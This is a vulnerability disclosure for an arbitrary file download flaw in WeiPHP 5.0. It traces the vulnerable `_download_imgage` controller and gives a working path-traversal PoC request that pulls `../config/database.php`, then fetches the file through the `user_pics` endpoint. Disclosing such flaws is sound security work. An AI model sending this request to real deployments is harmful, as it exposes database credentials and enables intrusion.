# Summary
WeiPHP 5.0 (https://github.com/weiphpdev/weiphp5.0) has an arbitrary file download vulnerabiity, which allows attacker to download any files unauthorizedly.

# Details
Vulnerable code is in `application\material\controller\Material.php#_download_imgage`:
![image](https://github.com/user-attachments/assets/a8dc2170-e65d-4dda-b0ec-cb919cdc44dc)

Then we need to find the path of the file, audit the code:
![image](https://github.com/user-attachments/assets/4c741645-7ada-4ea7-812e-2d0fc3d89a26)

```
Picture.php#addFile()
```
![image](https://github.com/user-attachments/assets/13bfa073-ed72-4281-a3e0-ab6d26a3f311)

We find that `insertGetId` is defined in:
![image](https://github.com/user-attachments/assets/84dbc544-3603-4fcd-97e8-a61e912ede7e)

That is to say, the data of file we download is inserted into `Picture` tables in database.

We can find in mysql database:
![image](https://github.com/user-attachments/assets/a6e54f33-56f5-4ba7-a15c-13adae34bbc0)

![image](https://github.com/user-attachments/assets/751631f6-4ee9-43ba-91fe-214faeea7836)

So we search `M('Picture')` and find this `user_pics()`, which is the same as the information leak vulnerability mentioned in https://github.com/N0zoM1z0/Vuln-Search/blob/main/WeiPHP5.0-Information%20Leak.md.

![image](https://github.com/user-attachments/assets/5932bbfa-9ab9-4585-98fe-bb34b4cf6f9a)

We can arbitrary download files, 
```
POST /public/index.php/material/Material/_download_imgage/?media_id=1&picUrl=../config/database.php
```
![image](https://github.com/user-attachments/assets/2be18afe-0cb0-49c0-964b-d62821cc0c3a)


and visit `/public/index.php/home/file/user_pics` to get the files' path.
![image](https://github.com/user-attachments/assets/b7f2f955-e51c-4a11-9c6b-7e9ea6d94595)


Download and open it:
![image](https://github.com/user-attachments/assets/ff728f34-a944-446c-8300-374bd6f68131)

It is the config file we downloaded arbitrarily.

# PoC
```
POST /public/index.php/material/Material/_download_imgage/?media_id=1&picUrl=../config/database.php
```
![image](https://github.com/user-attachments/assets/2be18afe-0cb0-49c0-964b-d62821cc0c3a)

Visit `/public/index.php/home/file/user_pics` and download it.
![image](https://github.com/user-attachments/assets/ff728f34-a944-446c-8300-374bd6f68131)
